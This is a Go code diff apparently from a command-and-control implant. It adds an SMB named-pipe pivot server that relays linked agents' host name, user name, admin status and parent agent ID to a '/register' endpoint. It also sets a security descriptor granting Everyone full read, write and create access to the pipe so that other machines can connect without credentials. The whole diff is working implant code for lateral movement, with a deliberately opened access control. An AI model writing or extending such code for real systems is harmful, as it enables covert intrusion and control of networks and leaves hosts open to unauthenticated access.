@@ -30,7 +30,27 @@ var (
 	procConnectNamedPipe    = syscall.NewLazyDLL("kernel32.dll").NewProc("ConnectNamedPipe")
 	procDisconnectNamedPipe = syscall.NewLazyDLL("kernel32.dll").NewProc("DisconnectNamedPipe")
 	procCancelIoEx          = syscall.NewLazyDLL("kernel32.dll").NewProc("CancelIoEx")
+	procConvertStringSecurityDescriptorToSecurityDescriptorW = syscall.NewLazyDLL("advapi32.dll").NewProc("ConvertStringSecurityDescriptorToSecurityDescriptorW")
+	procLocalFree = syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree")
 )
+
+// pipeSecAttr returns a SECURITY_ATTRIBUTES that grants Everyone full access
+// to the named pipe, enabling cross-machine connections without credential issues.
+func pipeSecAttr() *syscall.SecurityAttributes {
+	// SDDL: D:(A;;0x12019f;;;WD) — grant Everyone (WD) read+write+create_instance
+	sddl, _ := syscall.UTF16PtrFromString("D:(A;;0x12019f;;;WD)")
+	var sd uintptr
+	procConvertStringSecurityDescriptorToSecurityDescriptorW.Call(
+		uintptr(unsafe.Pointer(sddl)), 1, uintptr(unsafe.Pointer(&sd)), 0)
+	if sd == 0 {
+		return nil
+	}
+	sa := &syscall.SecurityAttributes{
+		Length:             uint32(unsafe.Sizeof(syscall.SecurityAttributes{})),
+		SecurityDescriptor: sd,
+	}
+	return sa
+}
 
 type pipeSession struct {
 	agentID string
@@ -115,6 +135,11 @@ func (ps *pipeServer) run() {
 		if err != nil {
 			return
 		}
+		sa := pipeSecAttr()
+		var saPtr uintptr
+		if sa != nil {
+			saPtr = uintptr(unsafe.Pointer(sa))
+		}
 		h, _, _ := procCreateNamedPipeW.Call(
 			uintptr(unsafe.Pointer(pipeW)),
 			uintptr(pipeAccessDuplex),
@@ -122,7 +147,7 @@ func (ps *pipeServer) run() {
 			uintptr(pipeUnlimitedInst),
 			uintptr(pipeBufSize),
 			uintptr(pipeBufSize),
-			0, 0,
+			0, saPtr,
 		)
 		if h == invalidHandle {
 			time.Sleep(500 * time.Millisecond)
@@ -173,13 +198,18 @@ func (ps *pipeServer) handleConn(conn *pipeConn) {
 		return
 	}
 
-	regBody, _ := json.Marshal(map[string]interface{}{
+	regMap := map[string]interface{}{
 		"hostname":  first["hostname"],
 		"username":  first["username"],
 		"os":        first["os"],
 		"pid":       first["pid"],
 		"transport": "smb",
-	})
+		"is_admin":  first["is_admin"],
+	}
+	if GlobalAgentID != "" {
+		regMap["parent_id"] = GlobalAgentID
+	}
+	regBody, _ := json.Marshal(regMap)
 	status, regRespRaw, err := ps.doRequest("POST", "/register", regBody)
 	if err != nil || status != http.StatusOK {
 		return
